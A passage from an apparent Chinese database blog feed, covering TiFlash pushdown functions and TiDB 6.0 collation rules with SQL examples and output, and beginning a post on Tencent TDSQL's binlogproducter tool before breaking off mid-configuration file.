<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">explain </span><br><span class="line"><span class="keyword">select</span> DAYNAME(dc), MONTHNAME(dc), DAYOFMONTH(dc), LAST_DAY(dc), DAYOFWEEK(dc), DAYOFYEAR(dc) <span class="keyword">from</span> t;</span><br></pre></td></tr></table></figure></div>
<img  alt="1.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220506-c07bfc9f-07fc-4596-8a92-c4ec7a588a0f.jpg"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>字符串函数 <code>REGEXP</code></li>
</ul>
<p>在过滤条件中增加正则判定，过滤以 <code>U</code> 开头的数据。但是，这里收到了一条警告信息，当前不支持下推到 TiKV。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">explain </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> t.cc1 regexp <span class="string">&#x27;^U&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<img  alt="2.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220506-1088a226-3546-4a16-978e-84b34f7b4032.jpg"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>操作符 <code>LEAST()</code>, <code>GREATEST()</code></li>
</ul>
<p>在过滤条件中增加最小值、最大值判断。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">explain </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> least(id, <span class="number">2</span>) <span class="operator">&lt;</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">explain</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> GREATEST(id, <span class="number">1</span>) <span class="operator">&gt;</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
<img  alt="3.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220506-c30defe2-8821-46f6-b735-217172568189.jpg"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>操作符 <code>istrue_with_null</code>, <code>istrue</code>, <code>isfalse</code></li>
</ul>
<p>判断结果真假。这三个操作符的官方文档内容较少，在准备文章的时候已提交了 <a class="link"   href="https://github.com/pingcap/docs-cn/issues/9295" >Issue#9295 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，相信官方会进行补充完善。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">explain </span><br><span class="line"><span class="keyword">select</span> istrue_with_null(id <span class="operator">&gt;</span> <span class="number">1</span>), istrue(id <span class="operator">=</span> <span class="number">1</span>), isfalse(id <span class="operator">=</span> <span class="number">1</span>) <span class="keyword">from</span> t;</span><br></pre></td></tr></table></figure></div>
<img  alt="4.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220506-0c4fa65d-687c-42c9-a231-066b75bf6fd8.jpg"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>算子 <code>Left Outer Semi Join</code>、<code>Anti Left Outer Semi Join</code></li>
</ul>
<p>新增支持下推的 2 个算子，上文新特性描述已做出阐释，下面这两条 SQL 的区别在于第二条语句使用了 <code>NOT IN</code>。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">explain </span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> t.id <span class="keyword">in</span> (<span class="keyword">select</span> t.id <span class="keyword">from</span> t) <span class="keyword">from</span> t) x;</span><br><span class="line"></span><br><span class="line">explain </span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> t.id <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> t.id <span class="keyword">from</span> t) <span class="keyword">from</span> t) x;</span><br></pre></td></tr></table></figure></div>
<img  alt="5.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220506-fb5d2cab-ab8d-4241-badd-4958f37875ed.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="使用建议">使用建议</h2>
<p>对于本文提及的支持计算下推的新特性已经正式发布，可以放心使用。<br>
但是这里提示一个使用建议，即 GBK 字符集的表是不能同步到 TiFlash 的，会报下面这个错误。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ERROR <span class="number">8200</span> (HY000): Unsupported <span class="keyword">ALTER</span> <span class="keyword">table</span> replica <span class="keyword">for</span> <span class="keyword">table</span> contain gbk charset</span><br></pre></td></tr></table></figure></div>
<p>也就是说如果数据表使用了 GBK 字符集，就无法使用本文解读的这些新特性。</p>
<p>引申一步，从源码文件 <code>charset.go</code> 的 <code>TiFlashSupportedCharsets</code> 变量可知，<br>
目前 TiFlash 所支持的字符集有 <code>UTF8, UTF8MB4, ASCII, Latin1, Binary</code> 这 5 种。<br>
所以，一般情况下，在创建数据表时，不建议使用 GBK 字符集。如果是迁移或重构项目，建议将数据转换为 UTF8mb4。</p>
<h2 id="总结">总结</h2>
<p>本文对 TiFlash 新支持下推的函数和算子进行了汇总，并进行逐一演示。<br>
从 TiDB v4 正式发布 TiFlash 组件，到 v5 引入 MPP 引擎，再到伴随 v6 的发布而正式宣布开源，TiFlash 已经逐步成熟，是 TiDB 走向 HTAP 的关键组件。<br>
期待 TiFlash 可以支持更多下推函数和算子，期望 TiFlash 可以运行得更快、更稳。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/400382" >https://www.modb.pro/db/400382 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/blog/2188d936?shareId=286bbfd2" >https://tidb.net/blog/2188d936?shareId=286bbfd2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/book/book-rush/performance/mpp-engine/tiflash-pushing-down" >https://tidb.net/book/book-rush/performance/mpp-engine/tiflash-pushing-down <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 6.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 6.x</tag>
        <tag>asktug</tag>
        <tag>tiflash</tag>
        <tag>mpp</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 6.x 新特性解读 | Collation 规则</title>
    <url>/2022/tidb/tidb-6.0-new-collation/</url>
    <content><![CDATA[<p>对数据库而言，合适的字符集和 collation 规则能够大大提升使用者运维和分析的效率。TiDB 从 v4.0 开始支持新 collation 规则，并于 TiDB 6.0 版本进行了更新。本文将深入解读 Collation 规则在 TiDB 6.0 中的变更和应用。</p>
<h2 id="引">引</h2>
<p>这里的“引”，有两层含义，这第一层是“<strong>引</strong>言”，从 <a class="link"   href="https://docs.pingcap.com/zh/tidb/v6.0/release-6.0.0-dmr#tidb-600-release-notes" >TiDB v6.0 发版说明 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中可以了解到，TiDB 6.0 引入了很多新特性，同时也引入了新的 <a class="link"   href="https://docs.pingcap.com/zh/tidb/v6.0/release-6.0.0-dmr#%E7%89%88%E6%9C%AC%E7%AD%96%E7%95%A5%E5%8F%98%E6%9B%B4" >发版模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，本文将对 TiDB 6.0 新特性一睹为快。</p>
<p>第二层含义是“抛砖<strong>引</strong>玉”，开源社区的力量是无穷尽的，希望有更多人可以参与到开源中来，那么如何参与开源，其实途径远不止提交代码一种，比如，在 AskTUG 社区提问、回答、互动，再如，发现 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable" >TiDB 官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 有 Bug 或信息不完整，提出 Issue 和解决方案，又如，参与 <a class="link"   href="https://tidb.net/book/book-rush" >TiDB 6.0 Book Rush! <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 活动，做版本评测、案例文章等等。</p>
<h2 id="默认启用新-Collation-规则">默认启用新 Collation 规则</h2>
<blockquote>
<p>TiDB 从 v4.0 开始支持新 collation 规则，在大小写不敏感、口音不敏感、padding 规则上与 MySQL 行为保持一致。</p>
</blockquote>
<p>TiDB 6.0 默认采用新的 Collation 规则。新 Collation 规则虽已在 TiDB 4.0 引入，但一直都是默认关闭项，只有集群初始化时才能变更。可通过系统表看到该变量值的设定。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TiDB [(none)] 18:45:27&gt; select * from mysql.tidb where variable_name = &#x27;new_collation_enabled&#x27;;</span><br><span class="line">+-----------------------+----------------+----------------------------------------------------+</span><br><span class="line">| VARIABLE_NAME         | VARIABLE_VALUE | COMMENT                                            |</span><br><span class="line">+-----------------------+----------------+----------------------------------------------------+</span><br><span class="line">| new_collation_enabled | True           | If the new collations are enabled. Do not edit it. |</span><br><span class="line">+-----------------------+----------------+----------------------------------------------------+</span><br><span class="line">1 row in set (0.003 sec)</span><br></pre></td></tr></table></figure></div>
<p>查看 <code>I_S.collations</code> 表，可以知道 TiDB 6.0 已支持 11 种规则，较之前未启用新 collation 框架的版本新增了 5 种规则，分别是 <code>gbk_bin</code>, <code>gbk_chinese_ci</code>, <code>utf8_general_ci</code>，<code>utf8_unicode_ci</code>, <code>utf8mb4_unicode_ci</code>。</p>
<p>由于很多旧系统使用的是 GBK 字符集，所以在做系统重构的项目，尤其涉及到数据迁移的情况时，对于 GBK 字符集的支持就显得尤为重要和实用。当然，对于新项目，建议使用 UTF8mb4。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TiDB [(none)] 18:45:51&gt; select version()\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">version(): 5.7.25-TiDB-v6.0.0</span><br><span class="line">1 row in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">TiDB [(none)] 18:46:00&gt; SELECT * FROM information_schema.collations;</span><br><span class="line">+--------------------+--------------------+------+------------+-------------+---------+</span><br><span class="line">| COLLATION_NAME     | CHARACTER_SET_NAME | ID   | IS_DEFAULT | IS_COMPILED | SORTLEN |</span><br><span class="line">+--------------------+--------------------+------+------------+-------------+---------+</span><br><span class="line">| ascii_bin          | ascii              |   65 | Yes        | Yes         |       1 |</span><br><span class="line">| binary             | binary             |   63 | Yes        | Yes         |       1 |</span><br><span class="line">| gbk_bin            | gbk                |   87 |            | Yes         |       1 | (#28645)</span><br><span class="line">| gbk_chinese_ci     | gbk                |   28 | Yes        | Yes         |       1 | (#28645)</span><br><span class="line">| latin1_bin         | latin1             |   47 | Yes        | Yes         |       1 |</span><br><span class="line">| utf8_bin           | utf8               |   83 | Yes        | Yes         |       1 |</span><br><span class="line">| utf8_general_ci    | utf8               |   33 |            | Yes         |       1 |</span><br><span class="line">| utf8_unicode_ci    | utf8               |  192 |            | Yes         |       1 | (#18678)</span><br><span class="line">| utf8mb4_bin        | utf8mb4            |   46 | Yes        | Yes         |       1 |</span><br><span class="line">| utf8mb4_general_ci | utf8mb4            |   45 |            | Yes         |       1 |</span><br><span class="line">| utf8mb4_unicode_ci | utf8mb4            |  224 |            | Yes         |       1 | (#18678)</span><br><span class="line">+--------------------+--------------------+------+------------+-------------+---------+</span><br><span class="line">11 rows in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">TiDB [test] 19:05:14&gt; SHOW CHARACTER SET;</span><br><span class="line">+---------+-------------------------------------+-------------------+--------+</span><br><span class="line">| Charset | Description                         | Default collation | Maxlen |</span><br><span class="line">+---------+-------------------------------------+-------------------+--------+</span><br><span class="line">| ascii   | US ASCII                            | ascii_bin         |      1 |</span><br><span class="line">| binary  | binary                              | binary            |      1 |</span><br><span class="line">| gbk     | Chinese Internal Code Specification | gbk_chinese_ci    |      2 |</span><br><span class="line">| latin1  | Latin1                              | latin1_bin        |      1 |</span><br><span class="line">| utf8    | UTF-8 Unicode                       | utf8_bin          |      3 |</span><br><span class="line">| utf8mb4 | UTF-8 Unicode                       | utf8mb4_bin       |      4 |</span><br><span class="line">+---------+-------------------------------------+-------------------+--------+</span><br><span class="line">6 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure></div>
<p>而在 TiDB v5.4 未启用新 Collation 的结果为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TiDB-v5.4 [test] 10:17:22&gt; select version()\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">version(): 5.7.25-TiDB-v5.4.0</span><br><span class="line">1 row in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">TiDB-v5.4 [test] 10:19:39&gt; SELECT * FROM information_schema.collations;</span><br><span class="line">+----------------+--------------------+------+------------+-------------+---------+</span><br><span class="line">| COLLATION_NAME | CHARACTER_SET_NAME | ID   | IS_DEFAULT | IS_COMPILED | SORTLEN |</span><br><span class="line">+----------------+--------------------+------+------------+-------------+---------+</span><br><span class="line">| utf8mb4_bin    | utf8mb4            |   46 | Yes        | Yes         |       1 |</span><br><span class="line">| latin1_bin     | latin1             |   47 | Yes        | Yes         |       1 |</span><br><span class="line">| binary         | binary             |   63 | Yes        | Yes         |       1 |</span><br><span class="line">| ascii_bin      | ascii              |   65 | Yes        | Yes         |       1 |</span><br><span class="line">| utf8_bin       | utf8               |   83 | Yes        | Yes         |       1 |</span><br><span class="line">| gbk_bin        | gbk                |   87 | Yes        | Yes         |       1 |</span><br><span class="line">+----------------+--------------------+------+------------+-------------+---------+</span><br><span class="line">6 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="新-Collation-注意事项">新 Collation 注意事项</h2>
<p>对于 TiDB 6.0 之前的版本，该配置项的默认值一直为 false ，但可以在集群初始化之前就改变其设定，如此就可以在集群初始化之后使用新的 collation 框架。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">service_configs:</span><br><span class="line">  tidb:</span><br><span class="line">    new_collations_enabled_on_first_bootstrap: true</span><br></pre></td></tr></table></figure></div>
<p>不过，这里要强调注意的是，当 TiDB 集群跨大版本升级时，需要检查配置项。以免出现上下游集群字符校验规则不一致而导致数据不同步或查询结果不一致的情况。另外，当使用 BR 进行数据备份、恢复时，也需要注意 Collation 的设置，保证备份前、恢复后的集群设置相同，防止出现因配置项<code>new_collations_enabled_on_first_bootstrap</code> 设定不同而报错。</p>
<h2 id="Collation-Bug-修复">Collation Bug 修复</h2>
<p>TiDB 6.0 中修复了2个关于 Collation 的 Bug，分别与比较函数和 JSON 相关，下面举两个小案例对其进行测试。</p>
<ol>
<li>修复带有 collation 的 greatest 或 least 函数结果出错的问题 #31789</li>
</ol>
<p>测试用例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE IF EXISTS t1;</span><br><span class="line">CREATE TABLE t1 (</span><br><span class="line">c1 char(20) CHARACTER SET utf8 COLLATE utf8_bin,</span><br><span class="line">c2 char(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin);</span><br><span class="line">INSERT INTO t1 VALUES (&#x27;UUtJeaV&#x27;,&#x27;snRXXCZHBPW&#x27;);</span><br><span class="line"></span><br><span class="line">SET names utf8mb4 collate utf8mb4_bin;</span><br><span class="line">SELECT greatest( c1, c2 ) as expr1 FROM t1;</span><br><span class="line">SELECT least( c1, c2 ) as expr1 FROM t1;</span><br><span class="line"></span><br><span class="line">SET names utf8mb4 collate utf8mb4_general_ci;</span><br><span class="line">SELECT greatest( c1, c2 ) as expr1 FROM t1;</span><br><span class="line">SELECT least( c1, c2 ) as expr1 FROM t1;</span><br></pre></td></tr></table></figure></div>
<p>测试结果：</p>
<ul>
<li>TiDB v5.4.0</li>
</ul>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2022-06-08_115256-1654660526515.png"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>TiDB v6.0.0</li>
</ul>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/1-1651711633100.png"
                      referrerpolicy="no-referrer"
                >
<ol start="2">
<li>修复了 json 类型在 builtin-func 中推导 collation 错误的问题 #31320</li>
</ol>
<p>修复这个问题的主要代码如下，期望表现是与 MySQL 一致，在使用 JSON 类型的内部方法时，应当始终使用 <code>utf8mb4_bin</code> 规则。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// The collation of JSON is always utf8mb4_bin in builtin-func which is same as MySQL</span><br><span class="line">// see details https://github.com/pingcap/tidb/issues/31320#issuecomment-1010599311</span><br><span class="line">if isJSON &#123;</span><br><span class="line">   dstCharset, dstCollation = charset.CharsetUTF8MB4, charset.CollationUTF8MB4</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>测试用例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> t2;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t2 (c1 json);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> t2 <span class="keyword">VALUES</span> (<span class="string">&#x27;&#123;\&quot;测试\&quot;: \&quot;你好\&quot;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">collation</span>(c1), <span class="keyword">collation</span>(<span class="built_in">upper</span>(c1)), <span class="keyword">collation</span>(elt(<span class="number">1</span>, c1, <span class="number">0x12</span>)) <span class="keyword">FROM</span> t2;</span><br></pre></td></tr></table></figure></div>
<p>测试结果：</p>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2-1651711643703.png"
                      referrerpolicy="no-referrer"
                >
<p>在 TiDB v5.4 中的测试结果为：</p>
<img  alt="4.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/tc-1651713777354.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="新增内置函数-CHARSET">新增内置函数 <code>CHARSET()</code></h2>
<p>TiDB 6.0 新增了一个新内置函数，用来判定入参的字符集，这与 Collation 是相关联的，所以一并举例演示。注：从 Issue <a class="link"   href="https://github.com/pingcap/tidb/issues/3931" >#3931 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 记录来看，这个需求早在 2017 年就提出来了，但是到 6.0 才合并到主干代码。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TiDB [test] 23:54:42&gt; select version()\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">version(): 5.7.25-TiDB-v6.0.0</span><br><span class="line">1 row in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">TiDB [test] 00:03:51&gt; set names utf8mb4;</span><br><span class="line">Query OK, 0 rows affected (0.000 sec)</span><br><span class="line"></span><br><span class="line">TiDB [test] 00:03:58&gt; select charset(1);</span><br><span class="line">+------------+</span><br><span class="line">| charset(1) |</span><br><span class="line">+------------+</span><br><span class="line">| binary     |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">TiDB [test] 00:04:03&gt; select charset(&#x27;1&#x27;);</span><br><span class="line">+--------------+</span><br><span class="line">| charset(&#x27;1&#x27;) |</span><br><span class="line">+--------------+</span><br><span class="line">| utf8mb4      |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="文档拾遗">文档拾遗</h2>
<p>正如开篇所提到的，参与开源的途径有很多种，我们从开源中收益，自然也要回馈社区。</p>
<p>举一个实际例子，在写本文查阅文档时，就发现了 <a class="link"   href="https://docs.pingcap.com/zh/tidb/v6.0/information-schema-collations#collations" >Collations <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 这节在 v6.0 (DMR) 版本下的查询结果集与实际不符，于是便进行了反馈。</p>
<img  alt="5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/3-1651711660998.png"
                      referrerpolicy="no-referrer"
                >
<p>在 GitHub 上提交了 Issue，处理速度也很快，第二天就已经完成初步修改，现处 Merge 到 master。</p>
<p>相关 Issue 链接为：<a class="link"   href="https://github.com/pingcap/docs/pull/8364" >https://github.com/pingcap/docs/pull/8364 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="末">末</h2>
<p>本文对 Collation 特性在 TiDB 6.0 中的变更进行了汇总阐释及举例说明，当前 TiDB 所提供的几种 Collation 已经可以支撑大部分业务场景，和大部分系统迁移需求建议在项目设计之初，就选用普适类型的字符集和规则，毕竟效率是提升生产力的重要因素之一。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/399619" >https://www.modb.pro/db/399619 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/blog/82d7530c?shareId=2a395d20" >https://tidb.net/blog/82d7530c?shareId=2a395d20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/book/book-rush/features/new-features/new-collation" >https://tidb.net/book/book-rush/features/new-features/new-collation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s/34hmemENLkTxaZ9OTDpc3Q" >https://mp.weixin.qq.com/s/34hmemENLkTxaZ9OTDpc3Q <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 6.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 6.x</tag>
        <tag>pingcap</tag>
        <tag>asktug</tag>
      </tags>
  </entry>
  <entry>
    <title>腾讯云数据库 TDSQL -- 备份工具 binlogproducter 解析</title>
    <url>/2022/tdsql/tencentcloud-tdsql-backup-binlogproducter/</url>
    <content><![CDATA[<h2 id="概要">概要</h2>
<p>本月参加了腾讯云TDSQL第二期训练营结营，并顺利通过考试，以此文纪念训练营顺利结营。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/tdsql/tencentcloud-tdsql-backup-binlogproducter/tdsql-course-grade.png"
                      alt="" loading="lazy"
                ></p>
<p>训练营上课过程中，老师们在每节课都贴心的准备了小礼物，虽然中奖率很低，但还是很幸运的抽中了一本杂志和公仔，感谢官方。O(∩_∩)O哈哈~</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/tdsql/tencentcloud-tdsql-backup-binlogproducter/tdsql-gift.png"
                      alt="" loading="lazy"
                ></p>
<p>言归正传，我们知道对于MySQL相关产品，二进制日志（Binlog）是一个不可或缺的组件，TDSQL for MySQL也是如此，而为了更加便利的将原数据抽取到其他类型的中间件或数据库或分析平台中，TDSQL专门打造了一款实用的工具—— <code>binlogproducter</code>。</p>
<p>从工具名中也可以直观地看出其作用是将 <code>binlog</code> 作为生产者（<code>producter</code>）。</p>
<p>下面，我将对此工具进行解析说明，希望对读者有所帮助。文末还提及了一个小问题，或许官方已经解决，但在此记录一下。</p>
<h2 id="腾讯云数据库-TDSQL">腾讯云数据库 TDSQL</h2>
<p>腾讯云数据库TDSQL是腾讯自研的企业级分布式数据库，在金融、政务、运营商、电商、游戏等数十个行业中落地应用，具备金融级高可用、强一致、高性能、高可靠等特性。目前，腾讯云数据库TDSQL 已助力 20 余家金融机构进行核心系统改造，TOP10银行中服务比例也高达60%。</p>
<h2 id="TDSQL-安装介质">TDSQL 安装介质</h2>
<p>征文大赛官方提供了一个安装介质和说明文档，本文所提到的路径和文件也是源于这两份素材。</p>
<p>将安装介质 <code>tdsql_10.3.17.3.0.zip</code> 解压后，便可以在路径 <code>tdsql_10.3.17.3.0/tdsql_packet/tdsql_tdsqlinstall</code> 下看到 <code>binlogproducter</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/data/shawnyan/tdsql_10.3.17.3.0/tdsql_packet/tdsql_tdsqlinstall$ ls</span><br><span class="line">binlogproducter  binlogproducter_percona  tdsqlinstall  tdsqlinstall.tgz</span><br></pre></td></tr></table></figure></div>
<p>一目了然，这里提供了两个版本的二进制文件。而在另一个目录中，提供了配置文件的模板文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/data/shawnyan/tdsql_10.3.17.3.0/tdsql_packet/tdsql_tdsqlinstall/tdsqlinstall/mysqlagent/conf$ ls</span><br><span class="line">mysqlagent_template.xml</span><br></pre></td></tr></table></figure></div>
<p>再有，官方提供的这个压缩包其实可以当作私有云的安装介质，那么必然会提供配套的安装脚本。<br>
通过检索目录可以看出，这里提供了 Ansible Playbook，与 binlogproducter 相关的任务在这个路径下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/data/shawnyan/tdsql_10.3.17.3.0/tdsql_install/playbooks/roles/tdsql_db_module/tasks$ ls</span><br><span class="line">main.yml</span><br><span class="line"></span><br><span class="line">/data/shawnyan/tdsql_10.3.17.3.0/tdsql_install/playbooks/roles/tdsql_db_module/files/shell_scripts$ ls</span><br><span class="line">install_db_module.sh</span><br></pre></td></tr></table></figure></div>
<p>最后，这两个二进制文件本身自带守护进程模式，但仍需要服务启停脚本来进行控制，对应的服务启停脚本在这个路径下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/data/shawnyan/tdsql_10.3.17.3.0/tdsql_packet/tdsql_tdsqlinstall/tdsqlinstall/mysqlagent/bin$ ls *binlogpro*</span><br><span class="line">restartbinlogproduct_cgroup.sh  stopbinlogproduct.sh  startbinlogproduct.sh  restartbinlogproduct.sh  startbinlogproduct_cgroup.sh</span><br></pre></td></tr></table></figure></div>
<p>接下来，将对上述文件逐一解析说明。</p>
<h2 id="binlogproducter-与-binlogproducter-percona">binlogproducter 与 binlogproducter_percona</h2>
<p>binlogproducter 与 binlogproducter_percona 这两个服务的作用相似，不同的是后者是兼容 Percona 的版本，适用于 TDSQL for MySQL 5.7 版本。<br>
该服务的核心功能是，解析该服务所在节点的 binlog，并推送到 Kafka 消息队列。<br>
该服务的启停均需要指定配置文件，配置文件的格式必须为 XML 格式。</p>
<p>简化版的服务启动方法如下，直接执行二进制文件，后面接配置文件路径即可。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./binlogproducter ../conf/mysqlagent_4001.xml</span><br><span class="line">./binlogproducter_percona ../conf/mysqlagent_4001.xml</span><br></pre></td></tr></table></figure></div>
<h2 id="binlogproducter-的模板文件">binlogproducter 的模板文件</h2>
<p>这里提供了一份配置文件的模板文件。<br>
需要注意的是，文件使用的是 gbk 编码，而非 UTF-8。<br>
由于这个工具并未开源代码，我们只能从实际使用、测试和配置文件来推测其详细功能。<br>
比如，它会监控是否有闪回（<code>flashback</code>）操作，是否有长事物（<code>long_trx</code>），以及没有主键的表（<code>no_primarykey</code>）。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=&#x27;gbk&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">local</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">        <span class="tag">&lt;<span class="name">processuser</span> <span class="attr">user</span>=<span class="string">&quot;tdsql&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">flashback</span> <span class="attr">flag</span>=<span class="string">&quot;1&quot;</span> <span class="attr">timerange</span>=<span class="string">&quot;3600&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xtrabackup</span> <span class="attr">setlimit</span>=<span class="string">&quot;0&quot;</span>  <span class="attr">dcnlimit</span>=<span class="string">&quot;30&quot;</span> <span class="attr">slave_flag</span>=<span class="string">&quot;2&quot;</span> <span class="attr">sql_dump</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">monitor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">myisam</span> <span class="attr">open</span>=<span class="string">&quot;1&quot;</span> <span class="attr">interval</span>=<span class="string">&quot;3600&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rowlock</span> <span 